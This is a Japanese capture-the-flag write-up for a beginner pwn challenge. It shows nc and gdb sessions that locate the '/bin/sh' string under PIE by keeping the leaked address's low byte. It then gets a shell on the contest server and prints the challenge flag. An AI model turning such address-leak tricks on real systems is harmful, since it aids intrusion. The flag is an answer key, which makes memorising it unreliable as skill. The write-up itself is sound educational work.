# binsh address:PWN:102pts
nc binsh.wanictf.org 9003  
- 文字列はメモリのどこかに配置されています。  
- strings -tx ./pwn03 | less  

使用ツール例  
- [netcat (nc)](https://github.com/wani-hackase/memo-setup-pwn-utils#netcat)  
- [strings](https://github.com/wani-hackase/memo-setup-pwn-utils#strings)  

セキュリティ保護  
- Full RELocation ReadOnly (RELRO)  
- Stack Smash Protection (SSP)有効  
- No eXecute bit(NX)有効  
- Position Independent Executable (PIE)有効  

[pwn03](pwn03)　　　　[pwn03.c](pwn03.c)  

# Solution
pwn03が配られる。  
実行してみると/bin/shのアドレスをよこせと言われる。  
PIEが有効なので末尾以外が変動する。  
gdbで解析する。  
```bash
$ nc binsh.wanictf.org 9003
The address of "input  " is 0x558370f45010.
Please input "/bin/sh" address as a hex number: ^C
$ nc binsh.wanictf.org 9003
The address of "input  " is 0x564495806010.
Please input "/bin/sh" address as a hex number: ^C
$ ./pwn03
The address of "input  " is 0x7f18f8002010.
Please input "/bin/sh" address as a hex number: ^C
$ ./pwn03
The address of "input  " is 0x7fc502202010.
Please input "/bin/sh" address as a hex number: ^C
$ gdb pwn03
~~~
gdb-peda$ start
~~~
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 2 results, display max 2 items:
pwn03 : 0x8202020 --> 0x68732f6e69622f ('/bin/sh')
 libc : 0x7fffff1b40fa --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ c
Continuing.
The address of "input  " is 0x8202010.
Please input "/bin/sh" address as a hex number: ^C
~~~
gdb-peda$ q
```
出力されたアドレスの末尾を20に変更すればよい。  
```bash
$ nc binsh.wanictf.org 9003
The address of "input  " is 0x560a6a0cf010.
Please input "/bin/sh" address as a hex number: 0x560a6a0cf020
Your input address is 0x560a6a0cf020.
Congratulation!
ls
chall
flag.txt
redir.sh
cat flag.txt
FLAG{cAn-f1nd-str1ng-us1ng-str1ngs}
^C
```
flagが得られた。  

## FLAG{cAn-f1nd-str1ng-us1ng-str1ngs}